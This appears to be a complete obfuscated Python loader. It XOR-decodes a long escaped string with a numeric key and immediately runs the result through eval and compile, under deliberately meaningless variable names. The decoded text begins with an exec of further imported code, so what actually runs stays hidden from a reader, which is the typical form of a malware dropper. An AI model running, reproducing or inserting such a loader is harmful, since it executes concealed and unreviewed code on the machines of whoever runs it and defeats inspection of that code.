wopvEaTEcopFEavc ="UART\x1b\x12\x17\x1bjY_UIVEB\x11FWT]PM\x1cO[]V\x18[RJP\x05\x05\x1cCFEBQD\x19MYUPoY_XB\x11N\x11\\X\x16GPY^V\x10\x00\x04\x1c\x03nZ\x11\x18\x18\x13\x19EJN\x08mW\x13\x10\x15\x16\x13\x15\x14\x18\x11B\nG^[YRA\x18E_Z\\RG\x18\x07\x15EXUS\\M\x19e~vsheakutz\x1dhZ\x19\x13\x19\x15\x13\x11\x10\x10\x12D\x19Q_[WU[A\x1b\x1f\x1eME]C\x02\x00\x07\x01\x18\x05\x0f\x0f\n\x01\x1fDZKFYPH\x16[VBL\x10\x1e\x05\x01\x05\t\x0c\x1f\x1aiZ\x18\x11\x11\x17\x14\x11\x18\x12\x17WDSQRkY\x13\x10\x15\x19\x16RN[\\IC\x0cm[\x18\x17\x16\x15\x19\x10\x15\x17\x14\x14\x14MZTP\x1dB\\UWG\x1f\x07\x19iW\\\x05FGELTD\x1fC_EWU^\x19\x10\x07z\x1f\x1dG\x1bKWWG\x10\x0c\x1a\x10j\x08jn_]\x0eC\x1bDVVB\x10]\x18kZFP[[P\x16ZUW\x1fS\x1a\x0cY\x03jY\x16\x18\x19\x19\x17\x16U\x1e\x05D\x18G\\SC\x1fX\x19X\\]\x11Q\x1a\x18l^WORQ\x18OUYZ\x1bWRZX]ADTFE\x1eWPD\\\x05\x0c\x1fV\x03\rVQRW\\V\x11U\x11\x1e\x1eJ\x1e@\x17\x0fEN\x1chV\x13\x13\x15\x1d" 

iOpvEoeaaeavocp = "0977305967689976158765905744493953100277205908537970161566517938145924188391872193056354811741827566"
uocpEAtacovpe = len(wopvEaTEcopFEavc)
oIoeaTEAcvpae = ""
for fapcEaocva in range(uocpEAtacovpe):
    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]
    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]
    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))


eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))